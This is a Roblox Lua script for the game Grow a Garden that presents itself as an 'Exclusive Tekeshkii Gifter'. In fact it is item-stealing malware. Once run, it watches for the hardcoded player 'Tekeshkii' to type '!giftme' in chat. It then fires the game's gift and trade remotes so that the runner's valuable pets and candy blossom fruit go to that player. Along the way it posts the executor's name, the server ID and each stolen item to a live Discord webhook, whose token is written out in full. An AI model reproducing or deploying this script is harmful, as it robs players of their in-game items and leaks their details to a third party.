-- Grow a Garden Exclusive Tekeshkii Gifter
local RECIPIENT_NAME = "Tekeshkii" -- CASE SENSITIVE
local WEBHOOK_URL = "https://discord.com/api/webhooks/1383491297859469433/StCTYTDOXN9jcRg-qBV59aNlF9uEyuAg2_OnAcknekx6tTvFPdw83T2uP6cmivRYOYEs"
local GIFT_COOLDOWN = 1.0 -- Safer cooldown between gifts
local ACTIVATION_PHRASE = "!giftme" -- Chat command to activate

-- Target items (only pets and candy blossom)
local TARGET_ITEMS = {
    Pets = {"dragonfly", "raccoon", "queen bee", "disco bee", "red fox"},
    Fruits = {"candy blossom"}
}

-- Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local TextChatService = game:GetService("TextChatService")

-- Variables
local lp = Players.LocalPlayer
local Backpack = lp:WaitForChild("Backpack")
local Recipient = nil
local GiftRemotes = {}
local currentJobId = game.JobId
local isGifting = false

-- Discord notification
local function notify(message, color)
    pcall(function()
        local req = (syn and syn.request) or (http and http.request) or http_request
        if req and WEBHOOK_URL ~= "" then
            req({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({
                    embeds = {{
                        title = "🎁 Exclusive Tekeshkii Gifter",
                        description = message,
                        color = color or 0xFF69B4,
                        fields = {
                            {name = "👤 Executor", value = lp.Name, inline = true},
                            {name = "🎯 Recipient", value = RECIPIENT_NAME, inline = true},
                            {name = "🆔 Job ID", value = currentJobId, inline = true}
                        },
                        footer = {text = os.date("%X")}
                    }}
                })
            })
        end
    end)
end

-- Verify Tekeshkii is the recipient
local function verifyRecipient(player)
    return player.Name == RECIPIENT_NAME
end

-- Find gifting remotes
local function findGiftRemotes()
    for _, remote in ipairs(ReplicatedStorage:GetDescendants()) do
        if remote:IsA("RemoteEvent") and (remote.Name:lower():find("gift") or remote.Name:lower():find("trade")) then
            table.insert(GiftRemotes, remote)
        end
    end
end

-- Check if item should be gifted
local function isGiftable(item)
    local name = item.Name:lower()
    for _, pet in ipairs(TARGET_ITEMS.Pets) do
        if name:find(pet:lower()) then return true, "Pet" end
    end
    for _, fruit in ipairs(TARGET_ITEMS.Fruits) do
        if name:find(fruit:lower()) then return true, "Fruit" end
    end
    return false
end

-- Equip item properly
local function safeEquip(item)
    if not lp.Character then return false end
    local humanoid = lp.Character:FindFirstChildOfClass("Humanoid")
    if not humanoid then return false end
    
    humanoid:EquipTool(item)
    local timeout = 0
    while humanoid:GetTool() ~= item and timeout < 10 do
        task.wait(0.1)
        timeout = timeout + 1
    end
    return humanoid:GetTool() == item
end

-- Gift item to Tekeshkii
local function giftToTekeshkii(item)
    if not Recipient or #GiftRemotes == 0 then return false end
    
    -- Verify Tekeshkii is still in game
    if not Recipient.Parent then
        notify("⚠️ Tekeshkii left the game", 0xFF0000)
        return false
    end
    
    -- Equip first
    if not safeEquip(item) then
        notify("⚠️ Failed to equip: "..item.Name, 0xFF0000)
        return false
    end
    
    -- Send gift through all remotes
    for _, remote in ipairs(GiftRemotes) do
        pcall(function() remote:FireServer(Recipient, item) end)
        pcall(function() remote:FireServer("Gift", Recipient, item) end)
    end
    
    return true
end

-- Main gifting process
local function startGifting()
    if isGifting then return end
    isGifting = true
    
    notify("🎁 Starting Tekeshkii gifting...", 0x00FF00)
    
    for _, item in ipairs(Backpack:GetChildren()) do
        if item:IsA("Tool") then
            local valid, itemType = isGiftable(item)
            if valid then
                if giftToTekeshkii(item) then
                    notify("➡️ Gifted "..itemType..": "..item.Name, 0xADD8E6)
                    task.wait(GIFT_COOLDOWN)
                else
                    break -- Stop if gifting fails
                end
            end
        end
    end
    
    notify("✅ Finished gifting to Tekeshkii", 0x00FF00)
    isGifting = false
end

-- Chat listener for Tekeshkii
local function setupChatListener()
    -- Modern chat system
    if TextChatService then
        TextChatService.OnIncomingMessage = function(message)
            if message.TextSource and verifyRecipient(Players:GetPlayerByUserId(message.TextSource.UserId)) then
                if string.lower(message.Text) == string.lower(ACTIVATION_PHRASE) then
                    startGifting()
                end
            end
        end
    else
        -- Legacy chat fallback
        Players.PlayerChatted:Connect(function(player, message)
            if verifyRecipient(player) and string.lower(message) == string.lower(ACTIVATION_PHRASE) then
                startGifting()
            end
        end)
    end
end

-- Player connection handler
local function onPlayerAdded(player)
    if verifyRecipient(player) then
        Recipient = player
        notify("🎯 Tekeshkii joined the server", 0x00FF00)
    end
end

-- Player removal handler
local function onPlayerRemoving(player)
    if verifyRecipient(player) then
        Recipient = nil
        notify("⚠️ Tekeshkii left the server", 0xFF0000)
    end
end

-- Initialize
notify("⚡ Tekeshkii Gifter Activated", 0x00FF00)
findGiftRemotes()

-- Set up event listeners
Players.PlayerAdded:Connect(onPlayerAdded)
Players.PlayerRemoving:Connect(onPlayerRemoving)
setupChatListener()

-- Check if Tekeshkii is already in game
for _, player in ipairs(Players:GetPlayers()) do
    if verifyRecipient(player) then
        Recipient = player
        notify("🎯 Tekeshkii already in server", 0x00FF00)
        break
    end
end
